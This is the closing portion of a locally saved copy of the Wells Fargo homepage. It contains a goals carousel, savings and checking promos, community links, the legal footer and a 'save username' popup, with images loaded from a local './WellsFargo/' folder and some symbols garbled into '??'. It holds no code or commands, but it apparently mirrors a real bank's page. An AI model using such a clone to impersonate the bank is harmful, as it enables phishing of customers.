                    </li>
                    <li role="tab" data-ia-code="C_efs_college_hpcarousel_web" id="nbaDefault5" aria-expanded="false"
                        aria-selected="false" aria-controls="nbaDefaultPanels5" aria-posinset="5" aria-setsize="7"
                        class="show5">


                        <div class="thumbText">
                            <span>Going to College</span>
                        </div>

                    </li>
                    <li role="tab" data-ia-code="C_wtr_investment_hpcarousel_web" id="nbaDefault6" aria-expanded="false"
                        aria-selected="false" aria-controls="nbaDefaultPanels6" aria-posinset="6" aria-setsize="7"
                        class="show6">


                        <div class="thumbText">
                            <span>Investing Basics</span>
                        </div>

                    </li>

                </ul>
            </div>
            <a href="Javascript:void(0);" class="paddle nextPaddle" role="button" tabindex="-1" aria-hidden="true"><img
                        alt="Next Slide"
                        src="./WellsFargo/home_sprite_image.png"></a>
            <div class="carouselFrameWrapper">


                <div class="carouselFrame item1" role="tabpanel" data-ia-code="C_ccd_credit_hpcarousel_web"
                     data-cid="tcm:84-147031-16" data-ctid="tcm:91-146912-32" id="nbaDefaultPanels1"
                     aria-labelledby="nbaDefault1" tabindex="0" style="display: block;"><span class="hidden">Begin item 1</span>
                    <div class="c63contentMain">

                        <img alt=""
                             src="./WellsFargo/FICO-phone-borrowing-and-credit-970x485.jpg">

                        <div class="c63content nbatheme1">
                            <h2>See how we can help you achieve your goals</h2>
                            <h3>Explore your credit options</h3>

                            <ul>
                                <li>
                                    <div class="c95textContent">
                                        <div class="nbaWrapper">
                                            <div class="nbaImg1"><a aria-hidden="true" tabindex="-1"
                                                                    href="https://www.wellsfargo.com/goals-credit/smarter-credit/improve-credit/?linkLoc=nba"><img
                                                            alt=""
                                                            src="./WellsFargo/home_sprite_image.png"></a>
                                            </div>
                                        </div>
                                        <span><a
                                                    href="https://www.wellsfargo.com/goals-credit/smarter-credit/improve-credit/?linkLoc=nba">Improve your credit &gt;</a></span>
                                    </div>
                                </li>
                                <li>
                                    <div class="c95textContent">
                                        <div class="nbaWrapper">
                                            <div class="nbaImg2"><a aria-hidden="true" tabindex="-1"
                                                                    href="https://www.wellsfargo.com/goals-credit/debt-to-income-calculator/?linkLoc=nba"><img
                                                            alt=""
                                                            src="./WellsFargo/home_sprite_image.png"></a>
                                            </div>
                                        </div>
                                        <span><a
                                                    href="https://www.wellsfargo.com/goals-credit/debt-to-income-calculator/?linkLoc=nba">Calculate your debt-to-income ratio &gt;</a></span>
                                    </div>
                                </li>
                                <li>
                                    <div class="c95textContent">
                                        <div class="nbaWrapper">
                                            <div class="nbaImg3"><a aria-hidden="true" tabindex="-1"
                                                                    href="https://www.wellsfargo.com/goals-credit/smarter-credit/manage-your-debt/consider-debt-consolidation/?linkLoc=nba"><img
                                                            alt=""
                                                            src="./WellsFargo/home_sprite_image.png"></a>
                                            </div>
                                        </div>
                                        <span><a
                                                    href="https://www.wellsfargo.com/goals-credit/smarter-credit/manage-your-debt/consider-debt-consolidation/?linkLoc=nba">Consolidate your debt &gt;</a></span>
                                    </div>
                                </li>
                            </ul>

                            <p>
                                <a class="c7" role="button" href="https://www.wellsfargo.com/goals-credit/?linkLoc=nba">Go
                                    to Borrowing and Credit</a>
                            </p>
                        </div>
                    </div>
                    <span class="hidden">End item 1</span>
                </div>


                <div class="carouselFrame item2" role="tabpanel" data-ia-code="C_chk_banking_hpcarousel_web"
                     data-cid="tcm:84-147025-16" data-ctid="tcm:91-146912-32" id="nbaDefaultPanels2"
                     aria-labelledby="nbaDefault2" tabindex="0" style="display: none;"><span
                            class="hidden">Begin item 2</span>
                    <div class="c63contentMain">

                        <img alt=""
                             src="./WellsFargo/paying-phone-beach-banking-made-easy-970x485.jpg">

                        <div class="c63content nbatheme1">
                            <h2>See how we can help you achieve your goals</h2>
                            <h3>Bank wherever life takes you</h3>


                            <ul>
                                <li>
                                    <div class="c95textContent">
                                        <div class="nbaWrapper">
                                            <div class="nbaImg4">
                                                <a aria-hidden="true" tabindex="-1"
                                                   href="https://www.wellsfargo.com/checking/switch/?linkLoc=nba">
                                                    <img alt=""
                                                         src="./WellsFargo/home_sprite_image.png">
                                                </a>


                                            </div>
                                        </div>
                                        <span>
						<a href="https://www.wellsfargo.com/checking/switch/?linkLoc=nba">Switch to Wells Fargo &gt;</a>
					</span>

                                    </div>
                                </li>
                                <li>
                                    <div class="c95textContent">
                                        <div class="nbaWrapper">
                                            <div class="nbaImg6">
                                                <a aria-hidden="true" tabindex="-1"
                                                   href="https://www.wellsfargo.com/checking/quickstart/account-alerts/?linkLoc=nba">
                                                    <img alt=""
                                                         src="./WellsFargo/home_sprite_image.png">
                                                </a>


                                            </div>
                                        </div>
                                        <span>
						<a href="https://www.wellsfargo.com/checking/quickstart/account-alerts/?linkLoc=nba">Get account alerts &gt;</a>
					</span>

                                    </div>
                                </li>
                                <li>
                                    <div class="c95textContent">
                                        <div class="nbaWrapper">
                                            <div class="nbaImg9">
                                                <a aria-hidden="true" tabindex="-1"
                                                   href="https://www.wellsfargo.com/online-banking/transfers/zelle/?linkLoc=nba">
                                                    <img alt=""
                                                         src="./WellsFargo/home_sprite_image.png">
                                                </a>


                                            </div>
                                        </div>
                                        <span>
						<a href="https://www.wellsfargo.com/online-banking/transfers/zelle/?linkLoc=nba">Learn more about <em>Zelle</em> &gt;</a>
					</span>

                                    </div>
                                </li>
                            </ul>


                            <p>
                                <a class="c7" role="button"
                                   href="https://www.wellsfargo.com/goals-banking-made-easy/index/?linkLoc=nba">Go to
                                    Banking Made Easy</a>
                            </p>
                        </div>
                    </div>
                    <span class="hidden">End item 2</span>
                </div>


                <div class="carouselFrame item3" role="tabpanel" data-ia-code="C_irw_retirement_hpcarousel_web"
                     data-cid="tcm:84-146969-16" data-ctid="tcm:91-146912-32" id="nbaDefaultPanels3"
                     aria-labelledby="nbaDefault3" tabindex="0" style="display: none;"><span
                            class="hidden">Begin item 3</span>
                    <div class="c63contentMain">

                        <img alt=""
                             src="./WellsFargo/couple-beach-retirement-970x485.jpg">

                        <div class="c63content nbatheme1">
                            <h2>See how we can help you achieve your goals</h2>
                            <h3>Take control of your retirement</h3>


                            <ul>
                                <li>
                                    <div class="c95textContent">
                                        <div class="nbaWrapper">
                                            <div class="nbaImg7">
                                                <a aria-hidden="true" tabindex="-1"
                                                   href="https://www.wellsfargo.com/financial-education/retirement/?linkLoc=nba">
                                                    <img alt=""
                                                         src="./WellsFargo/home_sprite_image.png">
                                                </a>


                                            </div>
                                        </div>
                                        <span>
						<a href="https://www.wellsfargo.com/financial-education/retirement/?linkLoc=nba">Get the basics of retirement &gt;</a>
					</span>

                                    </div>
                                </li>
                                <li>
                                    <div class="c95textContent">
                                        <div class="nbaWrapper">
                                            <div class="nbaImg8">
                                                <a aria-hidden="true" tabindex="-1"
                                                   href="https://www.wellsfargo.com/goals-retirement-income/?linkLoc=nba">
                                                    <img alt=""
                                                         src="./WellsFargo/home_sprite_image.png">
                                                </a>


                                            </div>
                                        </div>
                                        <span>
						<a href="https://www.wellsfargo.com/goals-retirement-income/?linkLoc=nba">Plan for retirement income &gt;</a>
					</span>

                                    </div>
                                </li>
                                <li>
                                    <div class="c95textContent">
                                        <div class="nbaWrapper">
                                            <div class="nbaImg9">
                                                <a aria-hidden="true" tabindex="-1"
                                                   href="https://www.wellsfargo.com/goals-retirement-income/managing-money/?linkLoc=nba">
                                                    <img alt=""
                                                         src="./WellsFargo/home_sprite_image.png">
                                                </a>


                                            </div>
                                        </div>
                                        <span>
						<a href="https://www.wellsfargo.com/goals-retirement-income/managing-money/?linkLoc=nba">Manage money in retirement &gt;</a>
					</span>

                                    </div>
                                </li>
                            </ul>


                            <p>
                                <a class="c7" role="button"
                                   href="https://www.wellsfargo.com/goals-retirement/?linkLoc=nba">Go to Retirement
                                    Planning</a>
                            </p>
                        </div>
                    </div>
                    <span class="hidden">End item 3</span>
                </div>


                <div class="carouselFrame item4" role="tabpanel" data-ia-code="C_mtg_homelending_hpcarousel_web"
                     data-cid="tcm:84-147015-16" data-ctid="tcm:91-146912-32" id="nbaDefaultPanels4"
                     aria-labelledby="nbaDefault4" tabindex="0" style="display: none;"><span
                            class="hidden">Begin item 4</span>
                    <div class="c63contentMain">


                        <img alt=""
                             src="./WellsFargo/couple-moving-in-homelending-970x485.jpg">


                        <div class="c63content nbatheme1">
                            <h2>See how we can help you achieve your goals</h2>
                            <h3>Your homeownership path starts here</h3>


                            <ul>
                                <li>
                                    <div class="c95textContent">
                                        <div class="nbaWrapper">
                                            <div class="nbaImg10">
                                                <a aria-hidden="true" tabindex="-1"
                                                   href="https://www.wellsfargo.com/mortgage/buying-a-house/?linkLoc=nba">
                                                    <img alt=""
                                                         src="./WellsFargo/home_sprite_image.png">
                                                </a>


                                            </div>
                                        </div>
                                        <span>
						<a href="https://www.wellsfargo.com/mortgage/buying-a-house/?linkLoc=nba">Buy a home &gt;</a>
					</span>

                                    </div>
                                </li>
                                <li>
                                    <div class="c95textContent">
                                        <div class="nbaWrapper">
                                            <div class="nbaImg11">
                                                <a aria-hidden="true" tabindex="-1"
                                                   href="https://www.wellsfargo.com/mortgage/rates/compare-loans/?linkLoc=nba">
                                                    <img alt=""
                                                         src="./WellsFargo/home_sprite_image.png">
                                                </a>


                                            </div>
                                        </div>
                                        <span>
						<a href="https://www.wellsfargo.com/mortgage/rates/compare-loans/?linkLoc=nba">Compare your loan options &gt;</a>
					</span>

                                    </div>
                                </li>
                                <li>
                                    <div class="c95textContent">
                                        <div class="nbaWrapper">
                                            <div class="nbaImg12">
                                                <a aria-hidden="true" tabindex="-1"
                                                   href="https://www.wellsfargo.com/mortgage/mortgage-refinance/?linkLoc=nba">
                                                    <img alt=""
                                                         src="./WellsFargo/home_sprite_image.png">
                                                </a>


                                            </div>
                                        </div>
                                        <span>
						<a href="https://www.wellsfargo.com/mortgage/mortgage-refinance/?linkLoc=nba">Refinance your mortgage &gt;</a>
					</span>

                                    </div>
                                </li>
                            </ul>


                            <p>
                                <a class="c7" role="button" href="https://www.wellsfargo.com/mortgage/?linkLoc=nba">Go
                                    to Home Lending</a>
                            </p>
                        </div>
                    </div>
                    <span class="hidden">End item 4</span>
                </div>


                <div class="carouselFrame item5" role="tabpanel" data-ia-code="C_efs_college_hpcarousel_web"
                     data-cid="tcm:84-146942-16" data-ctid="tcm:91-146912-32" id="nbaDefaultPanels5"
                     aria-labelledby="nbaDefault5" tabindex="0" style="display: none;"><span
                            class="hidden">Begin item 5</span>
                    <div class="c63contentMain">

                        <img alt=""
                             src="./WellsFargo/student-graduation-going-to-college-970x485.jpg">

                        <div class="c63content nbatheme1">
                            <h2>See how we can help you achieve your goals</h2>
                            <h3>Planning and paying for college</h3>


                            <ul>
                                <li>
                                    <div class="c95textContent">
                                        <div class="nbaWrapper">
                                            <div class="nbaImg13">
                                                <a aria-hidden="true" tabindex="-1"
                                                   href="https://www.wellsfargo.com/goals-going-to-college/paying-college/?linkLoc=nba">
                                                    <img alt=""
                                                         src="./WellsFargo/home_sprite_image.png">
                                                </a>


                                            </div>
                                        </div>
                                        <span>
						<a href="https://www.wellsfargo.com/goals-going-to-college/paying-college/?linkLoc=nba">Learn about financial aid &gt;</a>
					</span>

                                    </div>
                                </li>
                                <li>
                                    <div class="c95textContent">
                                        <div class="nbaWrapper">
                                            <div class="nbaImg14">
                                                <a aria-hidden="true" tabindex="-1"
                                                   href="https://www.wellsfargo.com/student/?linkLoc=nba">
                                                    <img alt=""
                                                         src="./WellsFargo/home_sprite_image.png">
                                                </a>


                                            </div>
                                        </div>
                                        <span>
						<a href="https://www.wellsfargo.com/student/?linkLoc=nba">Explore private student loans &gt;</a>
					</span>

                                    </div>
                                </li>
                                <li>
                                    <div class="c95textContent">
                                        <div class="nbaWrapper">
                                            <div class="nbaImg15">
                                                <a aria-hidden="true" tabindex="-1"
                                                   href="https://www.wellsfargo.com/goals-going-to-college/first-account/?linkLoc=nba">
                                                    <img alt=""
                                                         src="./WellsFargo/home_sprite_image.png">
                                                </a>


                                            </div>
                                        </div>
                                        <span>
						<a href="https://www.wellsfargo.com/goals-going-to-college/first-account/?linkLoc=nba">Manage your money while in school &gt;</a>
					</span>

                                    </div>
                                </li>
                            </ul>


                            <p>
                                <a class="c7" role="button"
                                   href="https://www.wellsfargo.com/goals-going-to-college/?linkLoc=nba">Visit Going to
                                    College</a>
                            </p>
                        </div>
                    </div>
                    <span class="hidden">End item 5</span>
                </div>


                <div class="carouselFrame item6" role="tabpanel" data-ia-code="C_wtr_investment_hpcarousel_web"
                     data-cid="tcm:84-147005-16" data-ctid="tcm:91-146912-32" id="nbaDefaultPanels6"
                     aria-labelledby="nbaDefault6" tabindex="0" style="display: none;"><span
                            class="hidden">Begin item 6</span>
                    <div class="c63contentMain">

                        <img alt=""
                             src="./WellsFargo/woman-tablet-investing-basics-970x485.jpg">

                        <div class="c63content nbatheme1">
                            <h2>See how we can help you achieve your goals</h2>
                            <h3>Pursue your investing goals</h3>


                            <ul>
                                <li>
                                    <div class="c95textContent">
                                        <div class="nbaWrapper">
                                            <div class="nbaImg16">
                                                <a aria-hidden="true" tabindex="-1"
                                                   href="https://www.wellsfargo.com/goals-investing/investing-types/?linkLoc=nba">
                                                    <img alt=""
                                                         src="./WellsFargo/home_sprite_image.png">
                                                </a>


                                            </div>
                                        </div>
                                        <span>
						<a href="https://www.wellsfargo.com/goals-investing/investing-types/?linkLoc=nba">Understand investment types &gt;</a>
					</span>

                                    </div>
                                </li>
                                <li>
                                    <div class="c95textContent">
                                        <div class="nbaWrapper">
                                            <div class="nbaImg17">
                                                <a aria-hidden="true" tabindex="-1"
                                                   href="https://www.wellsfargo.com/investing/compare-ways-to-invest/?linkLoc=nba">
                                                    <img alt=""
                                                         src="./WellsFargo/home_sprite_image.png">
                                                </a>


                                            </div>
                                        </div>
                                        <span>
						<a href="https://www.wellsfargo.com/investing/compare-ways-to-invest/?linkLoc=nba">Compare ways to invest &gt;</a>
					</span>

                                    </div>
                                </li>
                                <li>
                                    <div class="c95textContent">
                                        <div class="nbaWrapper">
                                            <div class="nbaImg18">
                                                <a aria-hidden="true" tabindex="-1"
                                                   href="https://www.wellsfargo.com/goals-investing/saving-vs-investing/?linkLoc=nba">
                                                    <img alt=""
                                                         src="./WellsFargo/home_sprite_image.png">
                                                </a>


                                            </div>
                                        </div>
                                        <span>
						<a href="https://www.wellsfargo.com/goals-investing/saving-vs-investing/?linkLoc=nba">To save or to invest? &gt;</a>
					</span>

                                    </div>
                                </li>
                            </ul>


                            <p>
                                <a class="c7" role="button"
                                   href="https://www.wellsfargo.com/goals-investing/?linkLoc=nba">Go to Investing
                                    Basics</a>
                            </p>
                        </div>
                    </div>
                    <span class="hidden">End item 6</span>
                </div>


                <div class="carouselFrame item7" role="tabpanel" data-ia-code="C_oth_fraud_hpcarousel_web"
                     data-cid="tcm:84-147034-16" data-ctid="tcm:91-146912-32" id="nbaDefaultPanels7"
                     aria-labelledby="nbaDefault7" tabindex="0" style="display: none;"><span
                            class="hidden">Begin item 7</span>
                    <div class="c63contentMain">


                        <img alt="" src="https://www.wellsfargo.com/" class="deferred"
                             data-deferred-src="https://www01.wellsfargomedia.com/assets/images/photography/lifestyle/970x485/woman_checking_tablet_device.jpg">


                        <div class="c63content nbatheme1">
                            <h2>See how we can help you achieve your goals</h2>
                            <h3>Keeping your money safe starts here</h3>


                            <ul>
                                <li>
                                    <div class="c95textContent">
                                        <div class="nbaWrapper">
                                            <div class="nbaImg22">
                                                <a aria-hidden="true" tabindex="-1"
                                                   href="https://www.wellsfargo.com/privacy-security/fraud/protecting-you/?linkLoc=nba">
                                                    <img alt=""
                                                         src="./WellsFargo/home_sprite_image.png">
                                                </a>


                                            </div>
                                        </div>
                                        <span>
						<a href="https://www.wellsfargo.com/privacy-security/fraud/protecting-you/?linkLoc=nba">Learn how we protect you &gt;</a>
					</span>

                                    </div>
                                </li>
                                <li>
                                    <div class="c95textContent">
                                        <div class="nbaWrapper">
                                            <div class="nbaImg23">
                                                <a aria-hidden="true" tabindex="-1"
                                                   href="https://www.wellsfargo.com/privacy-security/fraud/security-tools-and-options/?linkLoc=nba">
                                                    <img alt=""
                                                         src="./WellsFargo/home_sprite_image.png">
                                                </a>


                                            </div>
                                        </div>
                                        <span>
						<a href="https://www.wellsfargo.com/privacy-security/fraud/security-tools-and-options/?linkLoc=nba">Explore your security options &gt;</a>
					</span>

                                    </div>
                                </li>
                                <li>
                                    <div class="c95textContent">
                                        <div class="nbaWrapper">
                                            <div class="nbaImg24">
                                                <a aria-hidden="true" tabindex="-1"
                                                   href="https://www.wellsfargo.com/privacy-security/fraud/report?linkLoc=nba">
                                                    <img alt=""
                                                         src="./WellsFargo/home_sprite_image.png">
                                                </a>


                                            </div>
                                        </div>
                                        <span>
						<a href="https://www.wellsfargo.com/privacy-security/fraud/report?linkLoc=nba">Report fraud and scams &gt;</a>
					</span>

                                    </div>
                                </li>
                            </ul>


                            <p>
                                <a class="c7" role="button"
                                   href="https://www.wellsfargo.com/privacy-security/fraud/?linkLoc=nba">Visit the
                                    Security Center</a>
                            </p>
                        </div>
                    </div>
                    <span class="hidden">End item 7</span>
                </div>


            </div>
            <div class="carouselFrame incomingFrame" style="display: none;"></div>
        </div>


        <div class="largePromo fadeInElement" data-cid="tcm:242-147041-16" data-ctid="tcm:224-146926-32"
             style="opacity: 1;">

            <div class="iaRendered" data-slot-id="WF_CON_HP_PROD_SVC_BNR" lang="en"
                 data-offer-id="C_chk_everydaychecking_productservices_web">
                <div class="inner" data-cid="tcm:402-207720-16" data-ctid="tcm:91-146914-32">

                    <div class="col1">

                        <a class="i7" href="/checking/everyday/" tabindex="-1" aria-hidden="true" data-tracking-id="">
                            <img alt=""
                                 src="https://www20.wellsfargomedia.com/assets/images/contextual/banner/checking/489x234/6825911_gettyimages-1153899955_img_fph_489x234.jpg"
                                 class="deferred"
                                 data-deferred-src="https://www20.wellsfargomedia.com/assets/images/contextual/banner/checking/489x234/6825911_gettyimages-1153899955_img_fph_489x234.jpg">
                        </a>


                    </div>

                    <div class="col2">
                        <h3>Simplify your life</h3>
                        <span>Your money's at hand with Everyday Checking</span>
                        <a class="c7" role="button" href="/checking/everyday/" data-tracking-id="">Start now
                        </a>
                    </div>
                </div>
            </div>

        </div>

        <div class="recommendedTitleWrapper fadeInElement" data-cid="tcm:182-147037-16" data-ctid="tcm:223-146919-32"
             style="opacity: 1;">

            <h3 class="recommendedTitle">Suggested for you</h3>

        </div>

        <div class="hpAdditional fadeInElement" data-cid="tcm:242-147042-16" data-ctid="tcm:224-146928-32"
             style="opacity: 1;">
            <div class="hpAdditionalMainCol">

                <div class="iaRendered" data-slot-id="WF_CON_HP_SECONDARY_BNR_1" lang="en"
                     data-offer-id="C_sav_wtosave_hpsec_web">
                    <div class="hpAdditionalContentImg fadeMe" data-cid="tcm:402-207089-16"
                         data-ctid="tcm:91-146900-32">
                        <div class="wrapper" style="display: block;">

                            <a class="i7" href="/savings-cds/way2save/" enrollmentid="" data-tracking-id="">


                                <img alt=""
                                     src="https://www20.wellsfargomedia.com/assets/images/contextual/banner/savings/304x194/6818104_gettyimages-890847206_304_194.jpg"
                                     class="deferred"
                                     data-deferred-src="https://www20.wellsfargomedia.com/assets/images/contextual/banner/savings/304x194/6818104_gettyimages-890847206_304_194.jpg">
                                <span class="hpAdditionalContentCol">
			    <span class="c5headline">Ready for what's next</span>
                            <span class="hpAdditionalContentText">Easy, automatic: Build savings with Way2Save<sup>??</sup></span>
                            </span>
                            </a>


                        </div>
                    </div>
                </div>

                <div class="cmsDefault" data-slot-id="WF_CON_HP_SECONDARY_BNR_2" lang="en"
                     style="visibility: visible !important">

                    <div class="hpAdditionalContentImg fadeMe" data-cid="tcm:84-147019-16" data-ctid="tcm:91-146900-32">
                        <div class="wrapper" style="display: block;">


                            <a class="i7" href="/savings-cds/way2save/">


                                <img alt=""
                                     src="https://www01.wellsfargomedia.com/assets/images/homepage/wfic693_ph_b-jk_1027_3356_304x194.jpg">

                                <span class="hpAdditionalContentCol">
			    <span class="c5headline">Helping you save</span>
                            <span class="hpAdditionalContentText">Automatic transfers with a <em>Way2Save</em><sup>??</sup> savings account</span>
                            </span>
                            </a>


                        </div>
                    </div>

                </div>

                <div class="cmsDefault" data-slot-id="WF_CON_HP_SECONDARY_BNR_3" lang="en"
                     style="visibility: visible !important">

                    <div class="hpAdditionalContentImg fadeMe" data-cid="tcm:84-146971-16" data-ctid="tcm:91-146900-32">
                        <div class="wrapper" style="display: block;">


                            <a class="i7" href="/investing/retirement/rollover/distribution/">


                                <img alt=""
                                     src="https://www01.wellsfargomedia.com/assets/images/homepage/wfi111_ph_hre_default3_304x194.jpg"
                                     class="deferred"
                                     data-deferred-src="https://www01.wellsfargomedia.com/assets/images/homepage/wfi111_ph_hre_default3_304x194.jpg">

                                <span class="hpAdditionalContentCol">
			    <span class="c5headline">Questions about an old 401(k)?</span>
                            <span class="hpAdditionalContentText">Let???s talk about your options</span>
                            </span>
                            </a>


                        </div>
                    </div>

                </div>

            </div>
        </div>

        <!-- Bottom Region Starts-->
        <div class="bottomRegion fadeInElement" style="opacity: 1;">


            <div class="inner">
                <div class="col1">
                    <h2>Serving our customers and communities</h2>
                    <p>It doesn't happen with one transaction, in one day on the job or in one quarter. It's earned
                        relationship by relationship.</p>
                    <ul id="communityLinks">
                        <li>
                            <a href="/about/corporate/">
							<span class="communityLinkImg">
								<img alt=""
                                     src="https://www01.wellsfargomedia.com/assets/images/css/template/homepage/home_sprite_image.png">
							</span>
                                Who We Are
                            </a>


                        </li>
                        <li>
                            <a href="/help/customer-redress/">
							<span class="communityLinkImg">
								<img alt=""
                                     src="https://www01.wellsfargomedia.com/assets/images/css/template/homepage/home_sprite_image.png">
							</span>
                                Making Things Right ??? Customer Redress
                            </a>


                        </li>
                        <li>
                            <a href="/about/corporate-responsibility/">
							<span class="communityLinkImg">
								<img alt=""
                                     src="https://www01.wellsfargomedia.com/assets/images/css/template/homepage/home_sprite_image.png">
							</span>
                                Corporate Responsibility
                            </a>


                        </li>
                        <li>
                            <a href="/stories/">
							<span class="communityLinkImg">
								<img alt=""
                                     src="https://www01.wellsfargomedia.com/assets/images/css/template/homepage/home_sprite_image.png">
							</span>
                                Wells Fargo Stories
                            </a>


                        </li>
                    </ul>
                </div>
                <div class="box">
                    <img alt="" class="deferred"
                         src="https://www01.wellsfargomedia.com/assets/images/photography/lifestyle/wells-fargo-volunteer-gardening_414x240.jpg"
                         data-deferred-src="https://www01.wellsfargomedia.com/assets/images/photography/lifestyle/wells-fargo-volunteer-gardening_414x240.jpg">

                    <img alt="" class="deferred hide"
                         src="https://www01.wellsfargomedia.com/assets/images/homepage/stagecoach-two-drivers-field-green-414x240.jpg"
                         data-deferred-src="https://www01.wellsfargomedia.com/assets/images/homepage/stagecoach-two-drivers-field-green-414x240.jpg">

                    <img alt="" class="deferred hide"
                         src="https://www01.wellsfargomedia.com/assets/images/homepage/redress_414x240.jpg"
                         data-deferred-src="https://www01.wellsfargomedia.com/assets/images/homepage/redress_414x240.jpg">

                    <img alt="" class="deferred hide"
                         src="https://www01.wellsfargomedia.com/assets/images/homepage/three-men-volunteer-house-414x240.jpg"
                         data-deferred-src="https://www01.wellsfargomedia.com/assets/images/homepage/three-men-volunteer-house-414x240.jpg">

                    <img alt="" class="deferred hide"
                         src="https://www01.wellsfargomedia.com/assets/images/homepage/woman-sitting-chair-tablet-screenshot-414x240.jpg"
                         data-deferred-src="https://www01.wellsfargomedia.com/assets/images/homepage/woman-sitting-chair-tablet-screenshot-414x240.jpg">
                </div>
            </div>


        </div>
        <!-- Bottom Region Ends-->


    </div>


    <footer role="contentinfo">
        <div class="html5footer c9" id="pageFooter">


            <div class="c9content">


                <img alt="Together we&#39;ll go far" role="img"
                     src="./WellsFargo/homepage_footer_stagecoach.svg">


                <nav role="navigation">
                    <div class="html5nav">
                        <ul class="navList">

                            <li>
                                <a href="https://www.wellsfargo.com/privacy-security/">Privacy, Cookies, Security &amp;
                                    Legal</a>
                            </li>

                            <li>
                                <a href="https://www.wellsfargo.com/privacy-security/notice-of-data-collection/">Notice
                                    of Data Collection</a>
                            </li>

                            <li>
                                <a href="https://www.wellsfargo.com/privacy-security/terms/">General Terms of Use</a>
                            </li>

                            <li>
                                <a data-cid="tcm:84-147007-16" data-ctid="tcm:91-1866-32"
                                   href="https://www.wellsfargo.com/online-banking/online-access-agreement/">Online
                                    Access Agreement</a>
                            </li>

                            <li>
                                <a data-cid="tcm:84-147007-16" data-ctid="tcm:91-1866-32"
                                   href="https://www.wellsfargo.com/privacy-security/privacy/online/#adchoices">Ad
                                    Choices</a>
                            </li>

                            <li>
                                <a data-cid="tcm:84-147007-16" data-ctid="tcm:91-1866-32"
                                   href="https://www.wellsfargo.com/privacy-security/fraud/report/">Report Fraud</a>
                            </li>

                            <li>
                                <a data-cid="tcm:84-147007-16" data-ctid="tcm:91-1866-32"
                                   href="https://www.wellsfargo.com/about/?linkLoc=footer">About Wells Fargo</a>
                            </li>

                            <li>
                                <a data-cid="tcm:84-147007-16" data-ctid="tcm:91-1866-32"
                                   href="https://www.wellsfargo.com/about/careers/">Careers</a>
                            </li>

                            <li>
                                <a data-cid="tcm:84-147007-16" data-ctid="tcm:91-1866-32"
                                   href="https://www.wellsfargo.com/about/diversity/">Diversity and Accessibility</a>
                            </li>

                            <li>
                                <a data-cid="tcm:84-147007-16" data-ctid="tcm:91-1866-32"
                                   href="https://www.wellsfargo.com/sitemap">Sitemap</a>
                            </li>

                        </ul>
                    </div>
                </nav>


            </div>


            <div class="c42">
                <div class="c20">


                    <div class="socialIcons">
                        <a class="iconFacebook" href="https://www.facebook.com/wellsfargo">
                            <img class="facebookIcon" alt="Facebook" role="img"
                                 src="./WellsFargo/home_sprite_image.png">
                            &nbsp;
                        </a>


                        <a class="iconLinkedIn" href="https://www.linkedin.com/company/wellsfargo">
                            <img class="linkedInIcon" alt="LinkedIn" role="img"
                                 src="./WellsFargo/home_sprite_image.png">
                            &nbsp;
                        </a>


                        <a class="iconInstagram" href="https://instagram.com/wellsfargo/">
                            <img class="instagramIcon" alt="Instagram"
                                 src="./WellsFargo/home_sprite_image.png">
                            &nbsp;
                        </a>


                        <a class="iconPinterest" href="https://www.pinterest.com/wellsfargo/">
                            <img class="pinterestIcon" alt="Pinterest"
                                 src="./WellsFargo/home_sprite_image.png">
                            &nbsp;
                        </a>


                        <a class="iconYoutube" href="https://www.youtube.com/user/wellsfargo">
                            <img class="youtubeIcon" alt="YouTube"
                                 src="./WellsFargo/home_sprite_image.png">
                            &nbsp;
                        </a>


                        <a class="iconTwitter" href="https://twitter.com/wellsfargo">
                            <img class="twitterIcon" alt="Twitter"
                                 src="./WellsFargo/home_sprite_image.png">
                            &nbsp;
                        </a>


                    </div>


                    <div class="c20body" data-numbered="false">
                        <p>We provide links to external websites for convenience. Wells Fargo does not endorse and is
                            not responsible for their content, links, privacy, or security policies.</p>

                        <p>Investment products and services are offered through Wells Fargo Advisors. Wells Fargo
                            Advisors is a trade name used by Wells Fargo Clearing Services, LLC (WFCS) and Wells Fargo
                            Advisors Financial Network, LLC, Members <a href="https://www.wellsfargo.com/exit/sipc/">SIPC</a>,
                            separate registered broker-dealers and non-bank affiliates of Wells Fargo &amp; Company.
                            <em>WellsTrade</em><sup>??</sup> and Intuitive Investor<sup>??</sup> accounts are offered
                            through WFCS.</p>
                    </div>


                    <div id="c20nnm" class="c20notnot"><strong>Investment and Insurance Products are:</strong>
                        <ul>
                            <li><strong>Not Insured by the FDIC or Any Federal Government Agency</strong>
                            </li>
                            <li><strong>Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank
                                    Affiliate</strong>
                            </li>
                            <li><strong>Subject to Investment Risks, Including Possible Loss of the Principal Amount
                                    Invested</strong>
                            </li>
                        </ul>
                    </div>


                    <div class="c20body" data-numbered="false" data-cid="tcm:84-146986-16" data-ctid="tcm:91-1924-32">

                        <p>Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.
                        </p>

                    </div>


                    <p class="equalHousingImg">
							<span class="equalHousingIcon">
				<img alt="icon-equal-housing"
                     src="./WellsFargo/home_sprite_image.png">
			</span>


                        <strong>Equal Housing Lender</strong>
                    </p>


                    <p>?? 1999 - 2021 Wells Fargo. All rights reserved. NMLSR ID 399801</p>


                </div>
            </div>

        </div>
    </footer>


    <div aria-hidden="true" class="c29content movedown posCls tl" data-content-id="c29content-save-username"
         role="complementary" aria-labelledby="saveusername"><span class="hide c29begin">Beginning of popup</span><span
                class="c29close"><a href="https://www.wellsfargo.com/"><img alt="Close"
                                                                            src="./WellsFargo/home_sprite_image.png"></a></span>
        <p><strong>Notice</strong>
        </p>
        <p>For your security, we do not recommend using this feature on a shared device.</p>
        <span class="c29hook"></span><span class="hide">End of popup</span>
    </div>
</div>
<!-- end of shell div -->

</html>

